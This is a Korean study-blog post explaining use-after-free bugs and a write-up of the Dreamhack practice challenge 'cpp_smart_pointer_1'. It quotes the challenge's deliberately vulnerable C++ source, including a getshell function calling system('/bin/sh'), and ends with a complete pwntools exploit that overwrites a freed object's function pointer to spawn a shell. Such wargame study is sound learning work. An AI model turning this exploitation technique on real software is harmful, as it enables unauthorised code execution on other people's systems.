---
title: "[PWNABLE] Use After Free"
description: "Use After Free(UAF) 취약점은 메모리 할당 후 해제된 포인터를 여전히 사용할 때 발생하는 보안 취약점이다. 이는 메모리 관리에서 발생하는 오류로, 공격자는 이를 악용하여 프로그램의 비정상적인 동작을 유발하거나 임의의 코드를 실행할 수 있다. 메모리는 malloc 등을 통해 할당되고, free를 통해 해제된다"
date: "2024-06-24"
translation_key: "tistory-2656f66a8685"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-Use-After-Free"
private: false
---

Use After Free(UAF) 취약점은 메모리 할당 후 해제된 포인터를 여전히 사용할 때 발생하는 보안 취약점이다. 이는 메모리 관리에서 발생하는 오류로, 공격자는 이를 악용하여 프로그램의 비정상적인 동작을 유발하거나 임의의 코드를 실행할 수 있다.

메모리는 malloc 등을 통해 할당되고, free를 통해 해제된다. 해제된 메모리는 다른 용도로 재사용될 수 있다. 하지만 해제된 포인터가 계속 사용된다면, 이를 **Dangling Pointer**라고 한다.

![](/assets/images/tistory/tistory-2656f66a8685/001.png)

• **1단계**: 메모리 할당 (malloc)

• **2단계**: 메모리 해제 (free)

• **3단계**: 해제된 포인터가 다시 사용됨 (Dangling Pointer)

할당된 청크의 data영역이 freed된 청크의 헤더 부분에 해당이 된다.

즉, freed된 청크는 할당되어 있던 당시의 data 영역을 fd,bk 영역을 제외한 만큼 다시 가지게 된다.

그리고 동일한 크기의 청크를 할당하면 다시 freed된 청크가 할당이 되면서 이전에 있던 데이터 혹은 fd,bk의 내용에 접근이 가능하다.

* * *

#### dreamhack  cpp\_smart\_pointer\_1

C++을 잘 몰라서 코드를 제대로 이해하지는 못했다.

```
int main(){
    initialize();
    int selector = 0;
    Smart *smart = new Smart();
    std::shared_ptr<Smart> src_ptr(smart);
    std::shared_ptr<Smart> new_ptr(smart);
    while(1){
        print_menu();
        std::cin >> selector;
        switch(selector){
            case 1:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    change_pointer(src_ptr); // free
                } else if(selector == 2){
                    change_pointer(new_ptr);
                }
                break;
            case 2:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    src_ptr.reset();
                } else if(selector == 2){
                    new_ptr.reset();
                }
                break;
            case 3:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    (*src_ptr).fp();
                } else if(selector == 2){
                    (*new_ptr).fp();
                }
                break;
            case 4:
                write_guestbook();
                break;
            case 5:
                view_guestbook();
                break;
            case 6:
                return 0;
                break;
            default:
                break;
        }
    }
}
```

메인 함수를 보면 switch문으로 함수 호출, 힙영역 해제, 그리고 new/src\_ptr.fp()를 실행하는 기능을 한다.

그리고 상단 부분을 보면 smart라는 친구들이 있다/

```
Smart *smart = new Smart();
std::shared_ptr<Smart> src_ptr(smart);
std::shared_ptr<Smart> new_ptr(smart);
```

솔직히 아직 제대로 이해가 되지 않은 부분이다.

자동으로 인자를 가리킨다는 등의 개념으로 알고 있지만 아직 제대로 다뤄보지 않아서;;

일단 해당 기능에 대해 잘은 모르지만 각 기능이 수행될때 힙이 할당된다는 것이다.

![](/assets/images/tistory/tistory-2656f66a8685/002.png)

흠.. 일단 다른 함수 기능을 살펴보겠다.

case 1번의 경우 change\_pointer이라는 함수를 실행한다.

```
void change_pointer(std::shared_ptr<Smart> first){
    int selector = 0;
    std::cout << "1. apple\n2. banana\n3. mango" << std::endl;
    std::cout << "select function for smart pointer: ";
    std::cin >> selector;
    (*first).change_function(selector);
    std::cout << std::endl;
}

//구조체 코드 중 일부
void change_function(int select){
        if(select == 1){
            fp = apple;
        } else if(select == 2){
            fp = banana;
        } else if(select == 3){
            fp = mango;
        } else {
            fp = apple;
        }
    }
```

fp에 대한 기능을 설정하는 부분이다.

각 과일이름의 함수는 다음과 같이 정의되있다.

```
void apple(){
    std::cout << "Hi im apple!" << std::endl;
}

void banana(){
    std::cout << "Hi im banana!" << std::endl;
}

void mango(){
    std::cout << "Hi im mango!" << std::endl;
}
```

그럼 이 fp가 shell을 얻어내는 함수를 가리키게 만들면 된다.

```
void getshell(){
    std::cout << "Hi im shell!" << std::endl;
    std::cout << "what? shell?" << std::endl;
    system("/bin/sh");
}
```

case 2번의 경우 reset을 하고 있다.

```
case 2:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    src_ptr.reset();
                } else if(selector == 2){
                    new_ptr.reset();
                }
                break;
```

찾아보니 free하는 기능을 한다고;;;

case 3번의 경우 구조체의 fp에 있는 함수를 실행한다.

```
case 3:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    (*src_ptr).fp();
                } else if(selector == 2){
                    (*new_ptr).fp();
                }
                break;
```

case 4번의 경우 write\_guestbook함수를 호출한다.

```
void write_guestbook(){
    std::string data;
    std::cout << "write guestbook : ";
    std::cin >> data;
    guest_book = (char *)malloc(data.length() + 1);
    strcpy(guest_book, data.c_str());
}
```

흠.... malloc으로 힙 영역을 할당하고 데이터 부분에 값을 입력하는 것 같다.

case 5번의 경우는 view\_guestbook을 호출한다.

```
void view_guestbook(){
    std::cout << "guestbook data: ";
    std::cout << guest_book << std::endl;
}

//전역변수
char* guest_book = "guestbook\x00";
```

guest\_book에 있는 값을 출력한다.

취약점은 case 2번에서 터진다.

```
Smart *smart = new Smart();
std::shared_ptr<Smart> src_ptr(smart);
std::shared_ptr<Smart> new_ptr(smart);

...

case 2:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    src_ptr.reset();
                } else if(selector == 2){
                    new_ptr.reset();
                }
                break;
```

우선 samrt 포인터는 같은 메모리를 가리킬 경우 하나만 해제 혹은 둘다 해제될 때 uaf나 double free의 취약점이 발생한다고 한다.

그리고 마침 case 2에서는 둘 중 하나를 해제할 수 있다.

즉 src\_ptr을 free할 경우 new\_ptr을 통해서 free된 영역에 접근할 수 있게된다는 것이다.

이게 코드를 제대로 본 것이 맞다면 2개의 포인터 중 하나를 free하고 다시 malloc하면서 uaf 취약점을 이용한다.

솔직히 아직 잘 모르겠는게 cpp라 그런가 smart하면서 힙이 할당되고 하는게 잘 모르겠다.

![](/assets/images/tistory/tistory-2656f66a8685/003.png)

그나마 확실한 것은 나중에 생성된 2개의 포인터가 같은 영역인 0x616eb0이라는 영역을 가지고 있다.

0x402300은 smart 포인터에 대한 것인 것 같다.

![](/assets/images/tistory/tistory-2656f66a8685/004.png)

그리고 해당 영역을 확인하면 apple라는 함수의 주소가 들어있다.

![](/assets/images/tistory/tistory-2656f66a8685/005.png)

이제 두개의 포인터 중 하나를 해제해보겠다.

src\_ptr만 해제했는데 smart라는 것도 같이 free됬다

![](/assets/images/tistory/tistory-2656f66a8685/006.png)

메모리를 확인해보면 아직 2개의 ptr은 smart를 가리키고 있다.

![](/assets/images/tistory/tistory-2656f66a8685/007.png)

둘 중 하나를 free한 상태이다. 

여기서 src\_ptr을 다시 할당해보겠다.

![](/assets/images/tistory/tistory-2656f66a8685/008.png)

smart는 아직 할당되지 않았지만 src\_ptr을 할당된 모습이다.

![](/assets/images/tistory/tistory-2656f66a8685/009.png)

값도 정상적으로 들어갔다.

여기서 한번 더 할당한 모습이다.

![](/assets/images/tistory/tistory-2656f66a8685/010.png)

smart 까지 들어간 모습이다 .

![](/assets/images/tistory/tistory-2656f66a8685/011.png)

값을 확인해보면 정상적으로 입력한 값이 들어갔다.

0x606ea0이 smart 구조체 영역이므로 저 data영역에 getshell이라는 함수의 주소가 들어가게 된다면,

구조체의 fp()를 호출했을 때 셸을 얻을 수 있을 것이다.

```
from pwn import*

p = process('./cpp_smart_pointer_1')
e = ELF('cpp_smart_pointer_1')

pause()
p.sendlineafter(': ', '2')
p.sendlineafter(': ', '1')

pause()
p.sendlineafter(': ', '4')
p.sendlineafter(': ', 'a'*8)

pause()
p.sendlineafter(': ', '4')
p.sendlineafter(': ', p32(0x40161d))

pause()
p.sendlineafter(': ', '3')
p.sendlineafter(': ', '2')

p.interactive()
```

전체 페이로드이다. 실행하면 다음과  같이 셸을 얻을 수 있다.

![](/assets/images/tistory/tistory-2656f66a8685/012.png)
